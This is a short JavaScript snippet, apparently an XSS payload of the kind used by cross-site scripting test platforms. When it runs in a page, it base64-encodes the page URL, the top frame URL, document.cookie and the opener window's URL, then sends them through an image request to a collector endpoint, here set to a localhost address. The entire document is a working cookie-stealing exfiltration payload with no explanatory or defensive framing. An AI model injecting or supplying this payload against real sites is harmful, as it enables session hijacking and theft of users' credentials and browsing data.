var website = 'http://127.0.0.1:5000/rec';
(function() {
  (new Image()).src = website + '?token=' + escape((function() {
       try {
           return window.btoa(document.location.href)
      } catch (e) {
           return ''
      }
  })()) + '.' + escape((function() {
       try {
           return window.btoa(top.location.href)
      } catch (e) {
           return ''
      }
  })()) + '.' + escape((function() {
       try {
           return window.btoa(document.cookie)
      } catch (e) {
           return ''
      }
  })()) + '.' + escape((function() {
       try {
           return (window.opener && window.opener.location.href) ? window.btoa(window.opener.location.href) : ''
      } catch (e) {
           return ''
      }
  })());
})();